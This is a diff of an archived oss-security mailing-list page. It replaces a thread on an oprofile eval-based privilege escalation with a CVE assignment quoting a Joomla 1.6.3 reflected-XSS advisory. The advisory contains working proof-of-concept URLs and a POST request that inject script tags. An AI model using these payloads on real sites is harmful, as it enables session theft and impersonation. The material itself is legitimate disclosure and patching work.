@@ -1,56 +1,148 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/05/03/2
-Message-ID: <4DBF3360.3010109@caps-entreprise.com>
-Date: Tue, 03 May 2011 00:42:40 +0200
-From: Stephane Chauveau <stephane.chauveau@...s-entreprise.com>
-To: William Cohen <wcohen@...hat.com>
-CC: oss-security <oss-security@...ts.openwall.com>,  Jan Lieskovsky <jlieskov@...hat.com>, "Steven M. Christey" <coley@...us.mitre.org>,  Maynard Johnson <maynardj@...ibm.com>, Robert Richter <robert.richter@....com>
-Subject: Re: CVE Request -- oprofile -- Local privilege escalation via crafted opcontrol event parameter when authorized by sudo
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/06/29/12
+Message-ID: <609112549.1024404.1309377240402.JavaMail.root@zmail01.collab.prod.int.phx2.redhat.com>
+Date: Wed, 29 Jun 2011 15:54:00 -0400 (EDT)
+From: Josh Bressers <bressers@...hat.com>
+To: oss-security@...ts.openwall.com
+Cc: coley <coley@...re.org>
+Subject: Re: CVE Request: Joomla! 1.6.3 and lower | Multiple Cross Site Scripting (XSS) Vulnerabilities
 Content-Type: text/plain; charset=utf-8
 
-On 05/01/2011 04:00 AM, William Cohen wrote:
-> On 04/29/2011 02:16 PM, Jan Lieskovsky wrote:
->> Hello Josh, Steve, vendors,
->>
->>    It was found that oprofile profiling system did not properly sanitize
->> the content of event argument, provided to oprofile profiling control
->> utility (opcontrol). If a local unprivileged user was authorized by
->> sudoers file to run the opcontrol utility, they could use the flaw
->> to escalate their privileges (execute arbitrary code with the privileges
->> of the privileged system user, root). Different vulnerability than
->> CVE-2006-0576.
->>
->> References:
->> [1] http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=624212
->> [2] https://bugzilla.redhat.com/show_bug.cgi?id=700883
->>
->> Could you allocate a CVE id for this?
->>
->> Thank you&  Regards, Jan.
->> -- 
->> Jan iankko Lieskovsky / Red Hat Security Response Team
->>
->> P.S.: Oprofile is not encouraged to be run under sudo, but still
->>        should not allow escalation of privileges.
-> I don't know if this is the best way to fix this issue, but attached is a patch that filters out all but alpha numeric characters and '_'. Feedback on the patch would be appreciated.
->
-> -Will
-Hello,
+Please use CVE-2011-2509.
 
-unless I am missing something, the problem is only with the eval of $2 
-in set_event.
+Thanks.
 
-$1 is fine because it always contains a number that cannot be modified 
-by the user. If so, a simple patch could be to escape $2:
+-- 
+    JB
 
-set_event()
-{
-    eval "CHOSEN_EVENTS_$1=\$2"
-}
-
-Stephane (the original bug reporter)
-
-
-
-
-
+----- Original Message -----
+> Joomla! 1.6.3 and lower | Multiple Cross Site Scripting (XSS)
+> Vulnerabilities
+> 
+> 
+> 
+> 1. OVERVIEW
+> 
+> Joomla! 1.6.3 and lower are vulnerable to multiple Cross Site
+> Scripting issues.
+> 
+> 
+> 2. BACKGROUND
+> 
+> Joomla is a free and open source content management system (CMS) for
+> publishing content on the World Wide Web and intranets. It comprises a
+> model–view–controller (MVC) Web application framework that can also be
+> used independently.
+> Joomla is written in PHP, uses object-oriented programming (OOP)
+> techniques and software design patterns, stores data in a MySQL
+> database, and includes features such as page caching, RSS feeds,
+> printable versions of pages, news flashes, blogs, polls, search, and
+> support for language internationalization.
+> 
+> 
+> 3. VULNERABILITY DESCRIPTION
+> 
+> Several parameters (QueryString, option, searchword) in Joomla! Core
+> components (com_content, com_contact, com_newsfeeds, com_search) are
+> not properly sanitized upon submission to the /index.php url, which
+> allows attacker to conduct Cross Site Scripting attack. This may allow
+> an attacker to create a specially crafted URL that would execute
+> arbitrary script code in a victim's browser.
+> 
+> 
+> 4. VERSION AFFECTED
+> 
+> 1.6.3 and lower
+> 
+> 
+> 5. PROOF-OF-CONCEPT/EXPLOIT
+> 
+> 
+> component: com_contact , parameter: QueryString (Browser: All)
+> ===============================================================
+> 
+> http://attacker.in/joomla163_noseo/index.php?option=com_contact&view=category&catid=26&id=36&Itemid=-1"><script>alert(/XSS/)</script>
+> 
+> 
+> component:com_content , parameter: QueryString (Browser: All)
+> ===============================================================
+> 
+> http://attacker.in/joomla163_noseo/index.php?option=com_content&view=category&id=19&Itemid=260&limit=10&filter_order_Dir=&limitstart=&filter_order=><script>alert(/XSS/)</script>
+> 
+> 
+> component: com_newsfeeds , parameter: QueryString (Browser: All)
+> =================================================================
+> 
+> http://attacker.in/joomla163_noseo/index.php?option=com_newsfeeds&view=category&id=17&whateverehere="><script>alert(/XSS/)</script>&Itemid=253&limit=10&filter_order_Dir=ASC&filter_order=ordering
+> 
+> 
+> parameter: option (Browser: All)
+> ====================================
+> 
+> http://attacker.in/joomla163_noseo/index.php?option="><script>alert(/XSS/)</script>&task=reset.request
+> 
+> 
+> component: com_search, parameter: searchword (Browser: IE, Konqueror)
+> =====================================================================
+> 
+> [REQUEST]
+> POST /joomla163/index.php HTTP/1.1
+> Referer: http://attacker.in/joomla163/
+> User-Agent: Konqueror/4.5
+> Cache-Control: no-cache
+> Content-Type: application/x-www-form-urlencoded
+> Host: attacker.in
+> Accept-Encoding: gzip, deflate
+> Content-Length: 125
+> 
+> option=com_search&searchword='%2522%253C%252Fscript%253E%253Cscript%253Ealert(%252FXSS%252F)%253C%252Fscript%253E&task=search
+> [/REQUEST]
+> 
+> This searchword XSS was identified via source code:
+> http://yehg.net/lab/pr0js/advisories/joomla/core/1.6.3/xss/XSS%20%5bMode=SEO,NON-SEO%5d/(searchword)_xss_vuln_code_portion.jpg
+> 
+> 
+> 6. IMPACT
+> 
+> Attackers can compromise currently logged-in user/administrator
+> session and impersonate arbitrary user actions available under
+> /administrator/ functions.
+> 
+> 
+> 7. SOLUTION
+> 
+> Upgrade to Joomla! 1.6.4 or higher
+> 
+> 
+> 8. VENDOR
+> 
+> Joomla! Developer Team
+> http://www.joomla.org
+> 
+> 
+> 9. CREDIT
+> 
+> This vulnerability was discovered by Aung Khant, http://yehg.net, YGN
+> Ethical Hacker Group, Myanmar.
+> 
+> 
+> 10. DISCLOSURE TIME-LINE
+> 
+> 2011-05-26: notified vendor
+> 2011-06-28: vendor released fix
+> 2011-06-28: vulnerability disclosed
+> 
+> 
+> 11. REFERENCES
+> 
+> Original Advisory URL:
+> http://yehg.net/lab/pr0js/advisories/joomla/core/[joomla_1.6.3]_cross_site_scripting(XSS)
+> Vendor Advisory URL:
+> http://developer.joomla.org/security/news/352-20110604-xss-vulnerability.html
+> XSS FAQ: http://www.cgisecurity.com/xss-faq.html
+> OWASP Top 10:
+> http://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project
+> CWE-79: http://cwe.mitre.org/data/definitions/79.html
+> 
+> 
+> #yehg [2011-06-28]
